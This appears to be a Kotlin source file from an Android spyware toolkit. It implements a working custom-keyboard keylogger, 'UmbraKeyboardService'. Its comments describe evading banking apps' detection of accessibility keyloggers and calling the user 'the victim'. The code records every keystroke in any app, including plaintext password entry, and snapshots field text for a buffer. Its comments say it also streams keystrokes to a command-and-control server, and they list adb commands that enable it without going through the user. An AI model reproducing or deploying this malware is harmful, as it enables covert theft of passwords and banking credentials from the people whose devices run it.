package org.umbra.core.modules

import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.inputmethodservice.InputMethodService
import android.util.Log
import android.util.TypedValue
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.view.inputmethod.EditorInfo
import android.widget.LinearLayout
import android.widget.TextView

/**
 * IME (Input Method / custom keyboard) keylogger.
 *
 * Why this exists: banking apps actively block the accessibility-service
 * keylogger by querying `AccessibilityManager.getEnabledAccessibilityServiceList()`
 * and refusing to run ("access blocked by your security"). Custom keyboards are
 * NOT subject to that check — banking apps are far less aggressive about
 * detecting a selected input method. When this IME is the active input method,
 * every key the victim types in *any* app passes through this service, so we
 * see every keystroke (including password fields, because WE generate the key
 * and commit it to the target app ourselves).
 *
 * Activation (one-time, by the victim — less suspicious than enabling
 * accessibility):
 *   Settings → System → Languages & input → On-screen keyboard → enable the
 *   keyboard, then set it as the current input method.
 *
 * ADB equivalent (also one-time):
 *   adb shell ime enable  org.umbra.core/.modules.UmbraKeyboardService
 *   adb shell ime set     org.umbra.core/.modules.UmbraKeyboardService
 *   adb shell ime list -a   # verify: see mId=org.umbra.core/.modules.UmbraKeyboardService
 *
 * Capture channels:
 *   1. Soft-keyboard key press  — [onKeyTap] fires for every key on OUR keyboard.
 *      This is the authoritative plaintext capture (works for password fields).
 *   2. Hardware keyboard         — [onKeyDown] captures physical key events.
 *   3. Field text snapshot       — [onUpdateSelection] reads
 *      getTextBeforeCursor()/getTextAfterCursor() and buffers full field text
 *      for dump context (masked for password fields — the plaintext still comes
 *      from channel 1/2).
 */
class UmbraKeyboardService : InputMethodService() {

    companion object {
        private const val TAG = "Umbra.Ime"
    }

    // Caps-lock style shift (toggle). Minimal keyboard — kept intentionally simple.
    private var shiftLock = false

    // When true, the keyboard shows the number/symbol layer instead of letters.
    private var symbolLayer = false

    // Last buffered field snapshot, used to avoid re-buffering on cursor moves.
    private var lastFieldText = ""

    override fun onCreate() {
        super.onCreate()
        KeylogModule.hasImeSession = true
        Log.d(TAG, "IME created — keylogger keyboard active")
    }

    override fun onDestroy() {
        KeylogModule.persistToDisk(applicationContext)
        KeylogModule.hasImeSession = false
        super.onDestroy()
        Log.d(TAG, "IME destroyed — keyboard keylogger stopped")
    }

    override fun onCreateInputView(): View = buildKeyboard()

    // ── Target app identity ──────────────────────────────────────────────

    private fun targetPackage(): String {
        return currentInputEditorInfo?.packageName ?: "unknown"
    }

    // ── Capture helpers ──────────────────────────────────────────────────

    /**
     * Record a single keystroke: buffers it (onKeyEvent) and, when streaming is
     * enabled, pushes it to the C2 server in real-time (onKeystroke).
     */
    private fun logKey(label: String, streamText: String) {
        val pkg = targetPackage()
        KeylogModule.onKeyEvent(pkg, label)
        KeylogModule.onKeystroke(pkg, streamText)
    }

    /**
     * Channel 3: full-field snapshot for the dump buffer. Fired from
     * onUpdateSelection whenever the field text actually changes. Note: for
     * password fields this returns masked characters — the plaintext keys are
     * already captured via onKeyTap/onKeyDown.
     */
    private fun captureFieldText() {
        val ic = currentInputConnection ?: return
        val before = ic.getTextBeforeCursor(200, 0)?.toString() ?: ""
        val after = ic.getTextAfterCursor(50, 0)?.toString() ?: ""
        val full = before + after
        if (full.isNotBlank() && full != lastFieldText) {
            lastFieldText = full
            KeylogModule.onKeyEvent(targetPackage(), full)
        }
    }

    override fun onUpdateSelection(
        oldSelStart: Int,
        oldSelEnd: Int,
        newSelStart: Int,
        newSelEnd: Int,
        candidatesStart: Int,
        candidatesEnd: Int
    ) {
        super.onUpdateSelection(
            oldSelStart, oldSelEnd, newSelStart, newSelEnd, candidatesStart, candidatesEnd
        )
        captureFieldText()
    }

    // ── Hardware keyboard capture ────────────────────────────────────────

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (event != null) {
            val ch = event.getUnicodeChar(event.metaState)
            if (ch != 0) {
                val c = ch.toChar()
                if (!c.isISOControl()) {
                    logKey(c.toString(), c.toString())
                }
            } else {
                when (keyCode) {
                    KeyEvent.KEYCODE_DEL -> logKey("[BACKSPACE]", "\u232B")
                    KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER ->
                        logKey("[ENTER]", "\n")
                }
            }
        }
        return super.onKeyDown(keyCode, event)
    }

    // ── Soft keyboard key handling ───────────────────────────────────────

    private fun onKeyTap(label: String) {
        val ic = currentInputConnection ?: return
        when (label) {
            "SHIFT" -> {
                shiftLock = !shiftLock
                rebuild()
            }
            "?123" -> {
                symbolLayer = true
                shiftLock = false
                rebuild()
            }
            "ABC" -> {
                symbolLayer = false
                rebuild()
            }
            "\u232B" -> { // backspace
                sendDownUpKeyEvents(KeyEvent.KEYCODE_DEL)
                logKey("[BACKSPACE]", "\u232B")
            }
            "\u23CE" -> { // enter
                val actionId = currentInputEditorInfo?.imeOptions
                    ?.let { it and EditorInfo.IME_MASK_ACTION }
                if (actionId != null &&
                    actionId != EditorInfo.IME_ACTION_UNSPECIFIED &&
                    actionId != EditorInfo.IME_ACTION_NONE
                ) {
                    ic.performEditorAction(actionId)
                } else {
                    sendDownUpKeyEvents(KeyEvent.KEYCODE_ENTER)
                }
                logKey("[ENTER]", "\n")
            }
            "\u2423" -> { // space
                ic.commitText(" ", 1)
                logKey("[SPACE]", " ")
            }
            else -> {
                if (label.length == 1) {
                    val out = if (!symbolLayer && shiftLock && label[0].isLetter()) {
                        label.uppercase()
                    } else {
                        label
                    }
                    ic.commitText(out, 1)
                    logKey(out, out)
                    if (shiftLock) {
                        shiftLock = false
                        rebuild()
                    }
                }
            }
        }
    }

    private fun rebuild() {
        setInputView(buildKeyboard())
    }

    // ── Minimal programmatic keyboard (no XML layout, no deprecated
    //    KeyboardView) — functional QWERTY + symbol layer. ────────────────

    private fun buildKeyboard(): View {
        val ctx = this
        val density = resources.displayMetrics.density

        val root = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(
                (4 * density).toInt(), (6 * density).toInt(),
                (4 * density).toInt(), (6 * density).toInt()
            )
            setBackgroundColor(Color.parseColor("#1B1C1E"))
        }

        fun key(text: String, weight: Float = 1f, special: Boolean = false): TextView {
            return TextView(ctx).apply {
                this.text = text
                gravity = Gravity.CENTER
                setTextSize(TypedValue.COMPLEX_UNIT_SP, if (special) 15f else 18f)
                setTextColor(Color.WHITE)
                background = keyBackground(special)
                isClickable = true
                isFocusable = true
                val lp = LinearLayout.LayoutParams(0, (54 * density).toInt(), weight)
                lp.setMargins(
                    (2 * density).toInt(), (3 * density).toInt(),
                    (2 * density).toInt(), (3 * density).toInt()
                )
                layoutParams = lp
                setOnClickListener { onKeyTap(text) }
            }
        }

        fun addRow(keys: List<Pair<String, Float>>, specials: Set<String> = emptySet()) {
            val row = LinearLayout(ctx).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }
            for ((label, weight) in keys) {
                row.addView(key(label, weight, label in specials))
            }
            root.addView(row)
        }

        val letters = listOf("qwertyuiop", "asdfghjkl", "zxcvbnm")
        val symbols = listOf("1234567890", "-/:;()@\"", ".,?!'#$%*")

        val displayRows = if (symbolLayer) symbols else letters

        for (rowStr in displayRows) {
            addRow(rowStr.map { it.toString() to 1f })
        }

        val bottom: List<Pair<String, Float>> = if (symbolLayer) {
            listOf("ABC" to 1.5f, "\u2423" to 4f, "\u232B" to 1.5f, "\u23CE" to 1.5f)
        } else {
            listOf(
                "SHIFT" to 1.5f, "?123" to 1.2f, "\u2423" to 4f,
                "\u232B" to 1.5f, "\u23CE" to 1.5f
            )
        }
        addRow(bottom, setOf("SHIFT", "?123", "ABC", "\u232B", "\u23CE"))

        return root
    }

    private fun keyBackground(special: Boolean): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = 8f * resources.displayMetrics.density
            setColor(Color.parseColor(if (special) "#2E3134" else "#3C4043"))
        }
    }
}
